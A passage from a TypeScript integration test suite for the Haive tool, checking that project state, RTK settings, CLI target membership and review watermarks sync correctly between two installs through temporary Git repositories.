        "C9: and the Pull lands the commit A pushed, with B's pending change beside A's",
        waited.result.error === null && contains(y, sent) && (await holdsBoth(y)),
        { error: waited.result.error, column: await columnOf(y) },
      );
    }

    // C10: the same for 01's confirm.
    {
      const { x, y } = await landing('c10');
      await setRender(y, { lspLanguages: ['php'] });
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      const sent = pushFrom(x, 'A: an agent', '.haive-data/state');
      const { ctx, detect } = await conversation(y);
      const detected = await detect();
      const waited = await rewrittenWhileWaiting(y, () =>
        attempt(async () => confirm(ctx, detected)),
      );
      check(
        "C10: a sweep rewrote the record file between 01's confirm setting it aside and moving",
        waited.blocked && waited.rewritten.includes(RECORD_RENDER),
        waited,
      );
      check(
        "C10: and the confirm lands the commit A pushed, with B's pending change beside A's",
        waited.result.error === null &&
          waited.result.value?.landed === true &&
          contains(y, sent) &&
          (await holdsBoth(y)),
        { error: waited.result.error, column: await columnOf(y) },
      );
    }

    // C11: a Save & push that finds conflicts puts the files Haive wrote back as they were.
    {
      const { x, y, origin } = await landing('c11');
      await setRender(y, { lspLanguages: ['php'] });
      await writeFile(path.join(y.repoPath, 'README.md'), '# B\n');
      git(y.repoPath, 'add', 'README.md');
      git(y.repoPath, 'commit', '-q', '-m', 'B: the README');
      await writeFile(path.join(x.repoPath, 'README.md'), '# A\n');
      const sent = pushFrom(x, 'A: the README', 'README.md');
      const head = git(y.repoPath, 'rev-parse', 'HEAD');
      const pending = await fileOf(y, RECORD_RENDER);
      const saved = await attempt(() =>
        save({ repositoryId: y.repositoryId, userId: y.userId, push: true }),
      );
      const headAfter = git(y.repoPath, 'rev-parse', 'HEAD');
      const originAfter = git(origin, 'rev-parse', 'main');
      // Save commits its own plan snapshot before it integrates, so HEAD may sit on that commit.
      const ownCommit = saved.value?.committed ? saved.value.commitSha : head;
      check(
        'C11: the Save reports the conflict, moves nothing past its own plan commit and pushes nothing',
        saved.error === null &&
          saved.value?.pushed === false &&
          saved.value.conflict?.paths.includes('README.md') === true &&
          headAfter === ownCommit &&
          (ownCommit === head || git(y.repoPath, 'rev-parse', `${ownCommit}^`) === head) &&
          originAfter === sent,
        {
          error: saved.error,
          conflict: saved.value?.conflict,
          pushed: saved.value?.pushed,
          committed: saved.value?.committed,
          head,
          headAfter,
          sent,
          originAfter,
          log: git(y.repoPath, 'log', '--format=%h %s', '-4').split('\n'),
          changed: headAfter === head ? [] : git(y.repoPath, 'diff', '--stat', head, headAfter),
        },
      );
      check(
        "C11: and B's render change is back on disk byte for byte, still uncommitted",
        (await fileOf(y, RECORD_RENDER)) === pending && dirtyOn(y).includes(RECORD_RENDER),
        dirtyOn(y).split('\n'),
      );
    }

    // C12: a Pull with nothing to land leaves the files Haive wrote as they were.
    {
      const { y } = await landing('c12');
      await setRender(y, { lspLanguages: ['php'] });
      await editPlan(y, 0, 'Edited on B');
      await writePlanMirror(y.db, y.repositoryId, y.repoPath);
      const files = [RECORD_RENDER, planFileRel, planMdRel];
      const before = await Promise.all(files.map((rel) => fileOf(y, rel)));
      const status = dirtyOn(y);
      const pulled = await attempt(() => pull({ repositoryId: y.repositoryId, userId: y.userId }));
      const after = await Promise.all(files.map((rel) => fileOf(y, rel)));
      check(
        'C12: a Pull with nothing to land changes none of the files Haive wrote',
        pulled.error === null &&
          pulled.value?.pulled?.fastForwarded === false &&
          isDeepStrictEqual(after, before) &&
          dirtyOn(y) === status,
        { error: pulled.error, status: dirtyOn(y).split('\n') },
      );
    }

    // C13: a Pull whose fetch fails, after the files Haive wrote were set aside, puts them back.
    {
      const { y } = await landing('c13');
      await setRender(y, { lspLanguages: ['php'] });
      await editPlan(y, 0, 'Edited on B');
      await writePlanMirror(y.db, y.repositoryId, y.repoPath);
      git(
        y.repoPath,
        'remote',
        'set-url',
        'origin',
        httpOrigin(path.join(tmp!, 'land-nowhere.git')),
      );
      const files = [RECORD_RENDER, planFileRel, planMdRel];
      const before = await Promise.all(files.map((rel) => fileOf(y, rel)));
      const status = dirtyOn(y);
      const pulled = await attempt(() => pull({ repositoryId: y.repositoryId, userId: y.userId }));
      const after = await Promise.all(files.map((rel) => fileOf(y, rel)));
      check(
        'C13: a Pull whose fetch fails leaves the files Haive wrote as they were',
        pulled.error !== null &&
          pulled.error.includes('git fetch failed') &&
          isDeepStrictEqual(after, before) &&
          dirtyOn(y) === status,
        { error: pulled.error, status: dirtyOn(y).split('\n') },
      );
    }

    // C14 (superseded by T121): push now also commits the portable state, even with no
    // remote integration. An unreadable state file must therefore hold the push. The running
    // workflow task alone still holds no no-op integration; its valid-state control is C14b.
    {
      const { y, origin } = await landing('c14');
      await editPlan(y, 0, 'Edited on B');
      await writeFile(path.join(y.repoPath, RECORD_RENDER), '{ edited by hand');
      await y.db.insert(schema.tasks).values({
        userId: y.userId,
        repositoryId: y.repositoryId,
        type: 'workflow',
        title: 'two-install-smoke',
        status: 'running',
      });
      const remoteBefore = git(origin, 'rev-parse', 'main');
      const saved = await attempt(() =>
        save({ repositoryId: y.repositoryId, userId: y.userId, push: true }),
      );
      check(
        'C14: a Save & push with nothing to land preserves malformed state and refuses the new state commit',
        saved.error !== null &&
          saved.error.includes('nothing was pushed') &&
          git(origin, 'rev-parse', 'main') === remoteBefore &&
          (await fileOf(y, RECORD_RENDER)) === '{ edited by hand',
        saved.error,
      );
    }

    {
      const { y, origin } = await landing('c14b');
      await editPlan(y, 0, 'Edited on B');
      await setRender(y, { lspLanguages: ['php'] });
      await y.db.insert(schema.tasks).values({
        userId: y.userId,
        repositoryId: y.repositoryId,
        type: 'workflow',
        title: 'two-install-smoke',
        status: 'running',
      });
      const pending = await fileOf(y, RECORD_RENDER);
      const saved = await attempt(() =>
        save({ repositoryId: y.repositoryId, userId: y.userId, push: true }),
      );
      check(
        'C14b: valid dirty state rides a no-integration push past a running workflow task',
        saved.error === null &&
          saved.value?.pushed === true &&
          git(origin, 'rev-parse', 'main') === git(y.repoPath, 'rev-parse', 'HEAD') &&
          git(origin, 'show', `main:${RECORD_RENDER}`).trim() === pending.trim(),
        saved.error ?? saved.value,
      );
    }

    // C15: a Save & push over a state file edited by hand is refused, naming it, and nothing is pushed.
    {
      const { x, y, origin } = await landing('c15');
      await editPlan(y, 0, 'Edited on B');
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      const sent = pushFrom(x, 'A: an agent', '.haive-data/state');
      await writeFile(path.join(y.repoPath, RECORD_RENDER), '{ edited by hand');
      const saved = await attempt(() =>
        save({ repositoryId: y.repositoryId, userId: y.userId, push: true }),
      );
      check(
        'C15: a Save & push over a state file edited by hand is refused, naming it, and nothing is pushed',
        saved.error !== null &&
          saved.error.includes(RECORD_RENDER) &&
          saved.error.includes('nothing was pushed') &&
          git(origin, 'rev-parse', 'main') === sent &&
          (await fileOf(y, RECORD_RENDER)) === '{ edited by hand',
        saved.error,
      );
    }

    // D24 / D25: an import records an RTK choice only from a record that carries one.
    {
      const origin = path.join(tmp!, 'rtk-source.git');
      git(tmp!, 'init', '-q', '--bare', '-b', 'main', origin);
      const seedDir = path.join(tmp!, 'rtk-source-seed');
      git(tmp!, 'clone', '-q', httpOrigin(origin), seedDir);
      await writeFile(path.join(seedDir, 'README.md'), '# rtk\n');
      git(seedDir, 'add', 'README.md');
      git(seedDir, 'commit', '-q', '-m', 'seed');
      git(seedDir, 'push', '-q', 'origin', 'HEAD:main');
      const url = httpOrigin(origin);
      const userOfSource = randomUUID();
      landUsers.push(userOfSource);
      const source = await cloneInstall(
        'A',
        dbA!,
        path.join(tmp!, 'rtk-source-a'),
        url,
        userOfSource,
      );
      const unrecordedRender = { ...RENDER_BASE, rtkChoiceRecorded: false };
      await source.db
        .update(schema.repositories)
        .set({ renderContext: unrecordedRender })
        .where(eq(schema.repositories.id, source.repositoryId));
      await writeProjectStateColumn(source.db, {
        repositoryId: source.repositoryId,
        repoPath: source.repoPath,
        column: unrecordedRender,
      });
      git(source.repoPath, 'add', '.haive-data/state');
      git(source.repoPath, 'commit', '-q', '-m', 'A: a record that carries no RTK choice');
      git(source.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      check(
        'S1: a source that never chose RTK commits a record without rtk-enabled.json',
        (await fileOf(source, rtkRel)) === '' &&
          git(source.repoPath, 'ls-files', '--', rtkRel) === '',
        await fileOf(source, rtkRel),
      );

      const clone = await cloneInstall('B', dbB!, path.join(tmp!, 'rtk-clone-b'), url);
      const stateOf = async (install: Install) => {
        const got = await rowsOf<{
          flag: boolean | null;
          rtk: boolean;
          stamped: boolean;
          held: unknown;
          repo_xmin: string;
          sync_xmin: string | null;
        }>(
          install.db,
          sql`select (r.render_context ->> 'rtkChoiceRecorded')::boolean as flag,
            r.rtk_enabled as rtk,
            r.rtk_choice_made_at is not null as stamped,
            s.base_snapshot #> '{settings,rtk-enabled}' as held,
            r.xmin::text as repo_xmin,
            s.xmin::text as sync_xmin
            from repositories r left join project_state_sync s on s.repository_id = r.id
            where r.id = ${install.repositoryId}`,
        );
        return 'rows' in got ? (got.rows[0] ?? null) : null;
      };
      const pass = async (install: Install) => {
        await markProjectStateDirty(install.db, install.repositoryId);
        await sweepDirtyProjectStates(install.db);
      };
      const cloned = await stateOf(clone);
      await pass(clone);
      check(
        'S1: a clone of that record records no RTK choice, its sweep writes no rtk-enabled.json and its checkout stays clean',
        cloned?.flag === false &&
          cloned.stamped === false &&
          (await fileOf(clone, rtkRel)) === '' &&
          git(clone.repoPath, 'status', '--porcelain', '--', rtkRel) === '' &&
          dirtyOn(clone) === '',
        { cloned, file: await fileOf(clone, rtkRel), status: dirtyOn(clone) },
      );

      await rm(path.join(clone.repoPath, rtkRel), { force: true });
      await source.db.execute(
        sql`update repositories set rtk_enabled = false, rtk_choice_made_at = now(),
          render_context = jsonb_set(render_context, '{rtkChoiceRecorded}', 'true')
          where id = ${source.repositoryId}`,
      );
      await markProjectStateDirty(source.db, source.repositoryId);
      await sweepDirtyProjectStates(source.db);
      pushFrom(source, 'A: switches RTK off', '.haive-data/state');
      git(clone.repoPath, 'pull', '-q', '--ff-only', 'origin', 'main');
      await pass(clone);
      const adopted = await stateOf(clone);
      const askedOfClone = await askedAbout(clone);
      check(
        'S1: and once the source commits a choice the clone adopts it: the column records it, RTK follows the file, the base holds it, no stamp, nothing asked',
        adopted?.flag === true &&
          adopted.rtk === false &&
          adopted.held === false &&
          adopted.stamped === false &&
          'rows' in askedOfClone &&
          askedOfClone.rows.length === 0,
        { adopted, askedOfClone },
      );

      const settled = await stateOf(clone);
      let syncWrote = false;
      for (let i = 0; i < 3; i++) {
        const before = await stateOf(clone);
        const synced = await syncProjectStateFromCheckout(clone.db, {
          repositoryId: clone.repositoryId,
          repoPath: clone.repoPath,
        });
        const between = await stateOf(clone);
        syncWrote ||=
          synced.outcome !== 'unchanged' ||
          before?.repo_xmin !== between?.repo_xmin ||
          before?.sync_xmin !== between?.sync_xmin;
        await pass(clone);
      }
      const after = await stateOf(clone);
      const outbox = await rowsOf<{ clean: boolean }>(
        clone.db,
        sql`select written_revision >= revision as clean from project_state_outbox where repository_id = ${clone.repositoryId}`,
      );
      check(
        'S2: three more syncs and sweeps after the adoption keep the column, the RTK value and the base, each sync is unchanged and writes nothing to repositories or project_state_sync, the file stays as committed and the outbox clean',
        settled !== null &&
          after !== null &&
          !syncWrote &&
          after.flag === settled.flag &&
          after.rtk === settled.rtk &&
          after.held === settled.held &&
          git(clone.repoPath, 'status', '--porcelain', '--', rtkRel) === '' &&
          'rows' in outbox &&
          outbox.rows[0]?.clean === true,
        { settled, after, syncWrote, outbox },
      );

      // S3: the source removes the file; a recorded clone brings it back, an unrecorded one does not.
      git(source.repoPath, 'rm', '-q', '--', rtkRel);
      git(source.repoPath, 'commit', '-q', '-m', 'A: removes rtk-enabled.json');
      git(source.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      git(clone.repoPath, 'pull', '-q', '--ff-only', 'origin', 'main');
      await pass(clone);
      check(
        'S3: a recorded clone writes rtk-enabled.json again when the source removed it, with its own value',
        (await fileOf(clone, rtkRel)).trim() === 'false',
        await fileOf(clone, rtkRel),
      );
      await clone.db.execute(
        sql`update repositories set render_context = jsonb_set(render_context, '{rtkChoiceRecorded}', 'false')
          where id = ${clone.repositoryId}`,
      );
      await rm(path.join(clone.repoPath, rtkRel), { force: true });
      await pass(clone);
      check(
        'S3: and an unrecorded one writes none',
        (await fileOf(clone, rtkRel)) === '',
        await fileOf(clone, rtkRel),
      );
    }

    // B4.1: actual two-install union, then an explicit repository removal and Keep.
    {
      const unionOrigin = path.join(tmp!, 'union.git');
      git(tmp!, 'init', '-q', '--bare', '-b', 'main', unionOrigin);
      const unionSeed = path.join(tmp!, 'union-seed');
      git(tmp!, 'clone', '-q', remoteUrl, unionSeed);
      git(unionSeed, 'checkout', '-q', posted.output.commitSha!);
      git(unionSeed, 'remote', 'set-url', 'origin', httpOrigin(unionOrigin));
      git(unionSeed, 'push', '-q', 'origin', 'HEAD:refs/heads/main');
      const unionUserA = randomUUID();
      landUsers.push(unionUserA);
      const ua = await cloneInstall(
        'A',
        dbA!,
        path.join(tmp!, 'union-a'),
        httpOrigin(unionOrigin),
        unionUserA,
      );
      const ub = await cloneInstall('B', dbB!, path.join(tmp!, 'union-b'), httpOrigin(unionOrigin));
      const namesOf = async (install: Install): Promise<string[]> => {
        const [repo] = await install.db
          .select({ context: schema.repositories.renderContext })
          .from(schema.repositories)
          .where(eq(schema.repositories.id, install.repositoryId));
        return (repo?.context as { cliTargets?: string[] } | null)?.cliTargets ?? [];
      };
      const claudeBefore = new Map(
        await Promise.all(
          (await livePaths(ub))
            .filter((p) => p.startsWith('.claude/agents/'))
            .map(async (p) => [p, await fileOf(ub, p)] as const),
        ),
      );
      await ub.db.execute(
        sql`update repositories set render_context = jsonb_set(render_context, '{cliTargets}', '["claude-code","future-cli"]') where id = ${ub.repositoryId}`,
      );
      await ub.db
        .insert(schema.cliProviders)
        .values({ userId: ub.userId, name: 'codex', label: 'B Codex', enabled: true });
      await upgradeApplied(ub, () => ({}));
      check(
        'B4.1: B adds Codex through the default-on upgrade choice and keeps A Claude files byte-identical',
        isDeepStrictEqual((await namesOf(ub)).sort(), ['claude-code', 'codex', 'future-cli']) &&
          (await livePaths(ub)).some((p) => p.startsWith('.codex/agents/')) &&
          (
            await Promise.all(
              [...claudeBefore].map(async ([p, bytes]) => (await fileOf(ub, p)) === bytes),
            )
          ).every(Boolean),
      );
      pushFrom(
        ub,
        'B: maintain Codex too',
        '.haive-data/state',
        '.codex/agents',
        'CLAUDE.md',
        'AGENTS.md',
      );
      git(ua.repoPath, 'pull', '-q', '--ff-only', 'origin', 'main');
      await syncProjectStateFromCheckout(ua.db, {
        repositoryId: ua.repositoryId,
        repoPath: ua.repoPath,
      });
      await ua.db
        .update(schema.cliProviders)
        .set({ enabled: false })
        .where(eq(schema.cliProviders.userId, ua.userId));
      const quiet = await upgradePlan(ua);
      check(
        'B4.1: A imports the union without a Codex provider; disabling its local providers offers no teammate folder removal',
        isDeepStrictEqual((await namesOf(ua)).sort(), ['claude-code', 'codex', 'future-cli']) &&
          quiet.plan !== null &&
          quiet.plan.entries
            .filter(
              (e) =>
                e.diskPath.startsWith('.claude/agents/') || e.diskPath.startsWith('.codex/agents/'),
            )
            .every((e) => e.bucket === 'unchanged'),
      );
      await ua.db
        .update(schema.tasks)
        .set({ status: 'completed', completedAt: new Date() })
        .where(eq(schema.tasks.id, quiet.taskId));
      const codexPaths = (await livePaths(ua)).filter((p) => p.startsWith('.codex/agents/'));
      // Same authoritative column action as Tooling; public route/CAS/auth are covered in api tests.
      await ua.db.transaction(async (tx) => {
        await tx.execute(
          sql`update repositories set render_context = jsonb_set(render_context, '{cliTargets}', '["claude-code","future-cli"]') where id = ${ua.repositoryId}`,
        );
        await markProjectStateDirty(tx, ua.repositoryId);
      });
      check(
        'B4.1: repository membership removal alone deletes no files',
        codexPaths.length > 1 &&
          (await Promise.all(codexPaths.map(async (p) => (await fileOf(ua, p)).length > 0))).every(
            Boolean,
          ),
      );
      // R9: commit membership removal BEFORE cleanup, then clone its retained claims elsewhere.
      const [reducedRepo] = await ua.db
        .select({ context: schema.repositories.renderContext })
        .from(schema.repositories)
        .where(eq(schema.repositories.id, ua.repositoryId));
      await writeProjectStateColumn(ua.db, {
        repositoryId: ua.repositoryId,
        repoPath: ua.repoPath,
        column: reducedRepo!.context as Parameters<typeof writeProjectStateColumn>[1]['column'],
      });
      pushFrom(ua, 'A: stop Codex maintenance before file cleanup', '.haive-data/state');
      const uc = await cloneInstall(
        'B',
        dbB!,
        path.join(tmp!, 'union-deferred-cleanup-clone'),
        httpOrigin(unionOrigin),
      );
      await uc.db
        .insert(schema.cliProviders)
        .values({ userId: uc.userId, name: 'codex', label: 'Clone enabled Codex', enabled: true });
      const reducedMarkers = await uc.db
        .select()
        .from(schema.onboardingArtifacts)
        .where(
          and(
            eq(schema.onboardingArtifacts.repositoryId, uc.repositoryId),
            isNull(schema.onboardingArtifacts.supersededAt),
          ),
        );
      check(
        'R9: a fresh clone keeps removed Codex files and claims with only the reduced membership in every marker',
        isDeepStrictEqual(await namesOf(uc), ['claude-code', 'future-cli']) &&
          codexPaths.every((p) =>
            reducedMarkers.some(
              (r) =>
                r.diskPath === p &&
                r.sourceStepId === PROJECT_STATE_IMPORT_STEP_ID &&
                isDeepStrictEqual(
                  (r.formValuesSnapshot as { cliTargets?: string[] } | null)?.cliTargets,
                  ['claude-code', 'future-cli'],
                ),
            ),
          ) &&
          (
            await Promise.all(
              codexPaths.map(async (p) => (await fileOf(uc, p)) === (await fileOf(ua, p))),
            )
          ).every(Boolean),
      );
      const deferred = await upgradePlan(uc);
      check(
        'R9: after declining the still-enabled Codex addition, imported removed catalog paths are ordinary obsolete choices',
        deferred.plan !== null &&
          deferred.plan.cliAdditions?.includes('codex') === true &&
          codexPaths.every((p) =>
            deferred.plan!.entries.some((e) => e.diskPath === p && e.bucket === 'obsolete'),
          ),
      );
      await uc.db
        .update(schema.tasks)
        .set({ status: 'completed', completedAt: new Date() })
        .where(eq(schema.tasks.id, deferred.taskId));
      const cloneKeep = codexPaths[0]!;
      await upgradeApplied(
        uc,
        (plan) => ({
          selectedObsoleteRemovals: plan.entries
            .filter(
              (e) =>
                codexPaths.includes(e.diskPath) &&
                e.diskPath !== cloneKeep &&
                e.bucket === 'obsolete',
            )
            .map((e) => e.entryId),
          selectedObsoleteUntracks: plan.entries
            .filter((e) => e.diskPath === cloneKeep && e.bucket === 'obsolete')
            .map((e) => e.entryId),
        }),
        { addCliTargets: [] },
      );
      check(
        'R9: clone cleanup honors Remove and Keep without re-adding Codex or changing maintained Claude bytes',
        isDeepStrictEqual(await namesOf(uc), ['claude-code', 'future-cli']) &&
          !(await livePaths(uc)).some((p) => codexPaths.includes(p)) &&
          (await fileOf(uc, cloneKeep)).length > 0 &&
          (
            await Promise.all(
              codexPaths
                .filter((p) => p !== cloneKeep)
                .map(async (p) => (await fileOf(uc, p)) === ''),
            )
          ).every(Boolean) &&
          (
            await Promise.all(
              [...claudeBefore].map(async ([p, bytes]) => (await fileOf(uc, p)) === bytes),
            )
          ).every(Boolean),
      );

      const keep = codexPaths[0]!;
      await upgradeApplied(ua, (plan) => ({
        selectedObsoleteRemovals: plan.entries
          .filter((e) => e.bucket === 'obsolete' && e.diskPath !== keep)
          .map((e) => e.entryId),
        selectedObsoleteUntracks: plan.entries
          .filter((e) => e.bucket === 'obsolete' && e.diskPath === keep)
          .map((e) => e.entryId),
      }));
      check(
        'B4.1: upgrade removes the explicitly dropped imported targets while Keep leaves its chosen file untracked',
        (await fileOf(ua, keep)).length > 0 &&
          !(await livePaths(ua)).includes(keep) &&
          (
            await Promise.all(
              codexPaths.filter((p) => p !== keep).map(async (p) => (await fileOf(ua, p)) === ''),
            )
          ).every(Boolean) &&
          (
            await Promise.all(
              [...claudeBefore].map(async ([p, bytes]) => (await fileOf(ua, p)) === bytes),
            )
          ).every(Boolean) &&
          isDeepStrictEqual(await namesOf(ua), ['claude-code', 'future-cli']),
      );
      pushFrom(
        ua,
        'A: explicitly stop Codex maintenance',
        '.haive-data/state',
        '.codex/agents',
        'AGENTS.md',
      );
      git(ub.repoPath, 'pull', '-q', '--ff-only', 'origin', 'main');
      await syncProjectStateFromCheckout(ub.db, {
        repositoryId: ub.repositoryId,
        repoPath: ub.repoPath,
      });
      check(
        'B4.1: per-member deletion travels back to B despite Codex staying enabled there',
        isDeepStrictEqual(await namesOf(ub), ['claude-code', 'future-cli']),
      );
      const offeredAgain = await upgradePlan(ub);
      const cliChoice = offeredAgain.plan
        ? upgradePlanStep.form!(
            ctxFor(ub, offeredAgain.taskId, offeredAgain.stepId),
            offeredAgain.plan,
          )
        : null;
      check(
        'B4.1: a still-enabled removed CLI is a visible default-on addition choice',
        cliChoice?.fields.some(
          (f) => f.id === 'addCliTargets' && 'defaults' in f && f.defaults?.includes('codex'),
        ) === true,
      );
      await ub.db
        .update(schema.tasks)
        .set({ status: 'completed', completedAt: new Date() })
        .where(eq(schema.tasks.id, offeredAgain.taskId));
      await upgradeApplied(ub, () => ({}), { addCliTargets: [] });
      check(
        'B4.1: declining that addition keeps the repository removal authoritative',
        isDeepStrictEqual(await namesOf(ub), ['claude-code', 'future-cli']),
      );
      const blankId = randomUUID();
      await ua.db
        .update(schema.cliProviders)
        .set({ enabled: false })
        .where(eq(schema.cliProviders.userId, ua.userId));
      await ua.db
        .insert(schema.cliProviders)
        .values({ userId: ua.userId, name: 'codex', label: 'blank Codex', enabled: true });
      await ua.db.insert(schema.repositories).values({
        id: blankId,
        userId: ua.userId,
        name: 'blank-cli-portability',
        source: 'blank',
        branch: 'main',
      });
      await handleInit(
        { repositoryId: blankId, userId: ua.userId, source: 'blank', branch: 'main' },
        ua.db,
        path.join(tmp!, 'blank-cli'),
      );
      const [blankRepo] = await ua.db
        .select({
          path: schema.repositories.storagePath,
          context: schema.repositories.renderContext,
          claim: schema.repositories.rootClaimedAt,
        })
        .from(schema.repositories)
        .where(eq(schema.repositories.id, blankId));
      const initialCli = blankRepo?.path
        ? git(blankRepo.path, 'show', 'HEAD:.haive-data/state/cli/codex.json')
        : '';
      check(
        'B4.1: real blank INIT commits its own CLI unit through the ordinary rebuild-root claim and releases that claim',
        initialCli.includes('"provider": "codex"') &&
          blankRepo?.claim === null &&
          isDeepStrictEqual((blankRepo?.context as { cliTargets?: string[] })?.cliTargets, [
            'codex',
          ]),
      );
    }

    // B5.3: real independent databases share review progress through a Git record, without models.
    {
      const reviewOrigin = path.join(tmp, 'review-origin.git');
      const reviewSeed = path.join(tmp, 'review-seed');
      git(tmp, 'init', '-q', '--bare', '-b', 'main', reviewOrigin);
      git(tmp, 'clone', '-q', httpOrigin(reviewOrigin), reviewSeed);
      await writeFile(path.join(reviewSeed, 'code.txt'), 'base\n');
      for (const [rel, text] of renderProjectState(recordOf(contextA!))) {
        await mkdir(path.dirname(path.join(reviewSeed, '.haive-data/state', rel)), {
          recursive: true,
        });
        await writeFile(path.join(reviewSeed, '.haive-data/state', rel), text);
      }
      git(reviewSeed, 'add', '-A');
      git(reviewSeed, 'commit', '-qm', 'review base');
      git(reviewSeed, 'push', '-q', 'origin', 'HEAD:main');
      const reviewUserA = randomUUID();
      landUsers.push(reviewUserA);
      const ra = await cloneInstall(
        'A',
        dbA,
        path.join(tmp, 'review-a'),
        httpOrigin(reviewOrigin),
        reviewUserA,
      );
      const rb = await cloneInstall('B', dbB, path.join(tmp, 'review-b'), httpOrigin(reviewOrigin));
      const original = git(ra.repoPath, 'rev-parse', 'HEAD');
      await stampExternalWatermark(rb.db, rb.repositoryId, 'kb', original);
      await stampExternalWatermark(rb.db, rb.repositoryId, 'plan', original);
      await writeFile(path.join(ra.repoPath, 'code.txt'), 'reviewed one\n');
      git(ra.repoPath, 'commit', '-qam', 'first reviewed project change');
      const first = git(ra.repoPath, 'rev-parse', 'HEAD');
      await writeFile(path.join(ra.repoPath, 'code.txt'), 'reviewed two\n');
      git(ra.repoPath, 'commit', '-qam', 'second reviewed project change');
      const reviewed = git(ra.repoPath, 'rev-parse', 'HEAD');
      git(ra.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      git(rb.repoPath, 'pull', '-q', '--ff-only');
      const [reviewTask] = await rb.db
        .insert(schema.tasks)
        .values({
          userId: rb.userId,
          repositoryId: rb.repositoryId,
          type: 'workflow',
          title: 'review range only',
          status: 'completed',
        })
        .returning({ id: schema.tasks.id });
      const driftCtx = ctxFor(rb, reviewTask!.id, randomUUID());
      const before = await resolveExternalDrift(driftCtx, 'kb');
      check(
        'B5.3 red control: without A review progress B repeats both project commits',
        before.commits.length === 2,
        before,
      );
      await stampExternalWatermark(ra.db, ra.repositoryId, 'kb', reviewed);
      await stampExternalWatermark(ra.db, ra.repositoryId, 'plan', first);
      const identity = {
        GIT_AUTHOR_NAME: 't',
        GIT_AUTHOR_EMAIL: 't@example.com',
        GIT_COMMITTER_NAME: 't',
        GIT_COMMITTER_EMAIL: 't@example.com',
      };
      await prepareProjectStatePush(ra.db, {
        repositoryId: ra.repositoryId,
        sourcePath: ra.repoPath,
      });
      await ra.db.transaction((tx) =>
        commitProjectStatePush(tx, {
          repositoryId: ra.repositoryId,
          sourcePath: ra.repoPath,
          targetPath: ra.repoPath,
          identity,
        }),
      );
      git(ra.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      git(rb.repoPath, 'pull', '-q', '--ff-only');
      await syncProjectStateFromCheckout(rb.db, {
        repositoryId: rb.repositoryId,
        repoPath: rb.repoPath,
      });
      const kb = await resolveExternalDrift(driftCtx, 'kb');
      const plan = await resolveExternalDrift(driftCtx, 'plan');
      check(
        'B5.3 shared KB watermark eliminates duplicate review while plan stays independent',
        kb.measured &&
          kb.commits.length === 0 &&
          plan.commits.length === 1 &&
          plan.commits[0]?.sha === reviewed,
        { kb, plan },
      );
      const watermarkPath = path.join(
        rb.repoPath,
        '.haive-data/state/settings/review-watermarks.json',
      );
      await writeFile(
        watermarkPath,
        JSON.stringify({ kbSyncedCommit: first, planSyncedCommit: original }) + '\n',
      );
      await syncProjectStateFromCheckout(rb.db, {
        repositoryId: rb.repositoryId,
        repoPath: rb.repoPath,
      });
      let [progress] = await rb.db
        .select({
          kb: schema.repositories.kbSyncedCommit,
          plan: schema.repositories.planSyncedCommit,
        })
        .from(schema.repositories)
        .where(eq(schema.repositories.id, rb.repositoryId));
      check(
        'B5.3 incoming ancestor watermarks never rewind either column',
        progress?.kb === reviewed && progress.plan === first,
        progress,
      );
      await stampExternalWatermark(rb.db, rb.repositoryId, 'kb', original);
      [progress] = await rb.db
        .select({
          kb: schema.repositories.kbSyncedCommit,
          plan: schema.repositories.planSyncedCommit,
        })
        .from(schema.repositories)
        .where(eq(schema.repositories.id, rb.repositoryId));
      check(
        'B5.3 stale local review completion never rewinds a descendant watermark',
        progress?.kb === reviewed,
        progress,
      );
      await sweepDirtyProjectStates(rb.db);
      const rendered = JSON.parse(await readFile(watermarkPath, 'utf8')) as Record<string, unknown>;
      check(
        'B5.3 outbox re-renders the descendant review progress',
        rendered.kbSyncedCommit === reviewed && rendered.planSyncedCommit === first,
        rendered,
      );

      // Both commits are known ancestors of HEAD but incomparable with each other: ask, key by key.
      git(rb.repoPath, 'checkout', '-q', '-b', 'left-review');
      await writeFile(path.join(rb.repoPath, 'left.txt'), 'left\n');
      git(rb.repoPath, 'add', 'left.txt');
      git(rb.repoPath, 'commit', '-qm', 'left review');
      const left = git(rb.repoPath, 'rev-parse', 'HEAD');
      git(rb.repoPath, 'checkout', '-q', '-b', 'right-review', 'main');
      await writeFile(path.join(rb.repoPath, 'right.txt'), 'right\n');
      git(rb.repoPath, 'add', 'right.txt');
      git(rb.repoPath, 'commit', '-qm', 'right review');
      const right = git(rb.repoPath, 'rev-parse', 'HEAD');
      git(rb.repoPath, 'checkout', '-q', 'main');
      git(rb.repoPath, 'merge', '-q', '--no-edit', 'left-review', 'right-review');
      await stampExternalWatermark(rb.db, rb.repositoryId, 'kb', left);
      await writeFile(
        watermarkPath,
        JSON.stringify({ kbSyncedCommit: right, planSyncedCommit: first }) + '\n',
      );
      await syncProjectStateFromCheckout(rb.db, {
        repositoryId: rb.repositoryId,
        repoPath: rb.repoPath,
      });
      const [question] = await rb.db
        .select()
        .from(schema.projectStateConflicts)
        .where(
          and(
            eq(schema.projectStateConflicts.repositoryId, rb.repositoryId),
            isNull(schema.projectStateConflicts.resolvedAt),
          ),
        );
      check(
        'B5.3 incomparable same-key reviews ask without holding an upgrade',
        question?.unit === 'settings/review-watermarks.json#kbSyncedCommit' &&
          !blocksUpgrade(question.unit),
        question?.unit,
      );
      if (question) {
        const answered = await resolveProjectStateConflict(rb.db, {
          repositoryId: rb.repositoryId,
          userId: rb.userId,
          conflictId: question.id,
          answer: 'take_theirs',
        });
        [progress] = await rb.db
          .select({
            kb: schema.repositories.kbSyncedCommit,
            plan: schema.repositories.planSyncedCommit,
          })
          .from(schema.repositories)
          .where(eq(schema.repositories.id, rb.repositoryId));
        check(
          'B5.3 taking an incomparable KB answer preserves the plan review watermark',
          answered.kind === 'resolved' && progress?.kb === right && progress.plan === first,
          { answered, progress },
        );
      }
    }

    for (const name of Object.keys(KNOWN_GAPS)) {
      if (gapsChecked.has(name)) continue;
      failures += 1;
      log.error({ check: name }, 'FAILED: a known gap was never checked');
    }
  } finally {
    if (userA && dbA) await dbA.delete(schema.users).where(eq(schema.users.id, userA));
    if (dbA)
      for (const id of landUsers) await dbA.delete(schema.users).where(eq(schema.users.id, id));
    await poolB?.$client.end({ timeout: 5 });
    await dbA?.$client.end({ timeout: 5 });
    await dbB?.$client.end({ timeout: 5 });
